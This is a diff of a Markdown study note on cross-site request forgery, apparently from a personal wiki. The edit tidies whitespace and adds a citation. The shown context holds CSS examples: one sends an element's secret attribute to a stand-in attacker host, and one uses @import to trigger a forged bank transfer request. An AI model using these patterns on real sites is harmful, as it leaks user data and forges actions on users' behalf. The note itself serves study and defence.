@@ -47,15 +47,12 @@ The attack does not even require a JavaScript snippet to be executed. If the ser
 div[secret-data] {
     background-image: url("https://attacker.com/log?data="attr(secret-data));
 }
-
 ```
 
 - using the CSS `@import` statement
 
 ```css
-
 @import url("https://banca.com/transfer?amount=5000&to_account=123456");
-
 ```
 
 ### CSRF variants
@@ -110,6 +107,7 @@ There are similarities between CSRF and [[XSS (cross site scripting)]]. While th
 - Attack simulation, by [[(Saleh, Malkawi, et al., 2024)]]
 - client-side defense policies, [[(Maes, Heyman, et al., 2009)]]
 - server-side proxy, [[(Liu, Shen, et al., 2020)]]
+- ML comparison in CSRF,  [[(Ramadan, Osama, et al., 2024)]]
 
 [^1]: For more about authentication mechanisms and session management, see [[cookie]], [[sessions token]], [[JWT (JSON Web Token)]]
 
